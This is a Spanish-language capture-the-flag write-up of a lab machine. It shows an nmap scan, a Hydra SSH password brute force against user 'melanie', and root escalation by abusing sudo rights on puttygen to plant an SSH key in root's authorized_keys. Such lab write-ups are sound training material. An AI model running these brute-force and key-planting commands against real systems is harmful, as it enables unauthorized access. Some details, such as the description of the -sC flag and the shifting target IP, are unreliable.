# Fase 1- Tanteo
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/11c8a045-fd02-4e7c-9f85-1d77244e2436)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

2.  **22/tcp(SSH):** OpenSSH 9.2p1 
3. **80/tcp(HTTP):** Apache httpd 2.4.57

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Se encontró la pagina default de Debian Apache2.
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/0ea8fd93-91e0-4af0-a603-037d2a38015c)

# Fase 2- Exploración

#### Codigo
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/7af9032e-fe65-4173-8f48-ca9086db8b2d)

En el codigo fuente de la pagina, nos encontramos un mensaje que dice `Cambia la contraseña de ssh por favor melanie`.

# Fase 3- Explotación

#### Hydra
Realizamos fuerza bruta al protocolo ssh al usuario `melanie` con el diccionario `rockyou`. Comando utilizado:
```python
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.3 -F
```
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/2ebce5b6-1a57-4889-a24c-9b50b07b664e)
Y nos encontró la contraseña: `trustno1`.

# Fase 4- Privilegios

#### Sudo -l
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/ee0e7f7a-7315-4da9-9ced-92eae6c66b1f)

Despues de ingresar y realizar el tratamiento de la TTY, vemos que podemos ejecutar el binario `puttygen` como usuario `root`.

#### puttygen
Puttygen se utiliza específicamente para generar claves SSH. Vamos a generar una clave para el usuario root. Los comandos utilizados para escalar fueron:
```python
> puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id
> puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys
> sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/id
> sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh
> scp melanie@192.168.1.3:/home/melanie/.ssh/id .
> ssh -i id root@192.168.1.3
```
Primero, se genera una nueva clave SSH RSA de 2048 bits y se guarda como `~/.ssh/id`. Luego, se extrae la clave pública de este archivo y se añade al final de `~/.ssh/authorized_keys` para permitir la autenticación remota. La clave privada también se copia a un directorio seguro (`/root/.ssh/`), y la clave pública se exporta en formato OpenSSH a `/root/.ssh/authorized_keys` para permitir la autenticación desde otros sistemas. Adicionalmente, se copia la clave privada desde un servidor remoto a tu máquina local usando `scp`. Finalmente, para conectarte a un servidor remoto, usas la clave privada específica (`id`) con `ssh -i id root@192.168.1.3`.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/2305106f-f622-46b4-8648-9293ceac4abe)

y de esa forma somos root!.
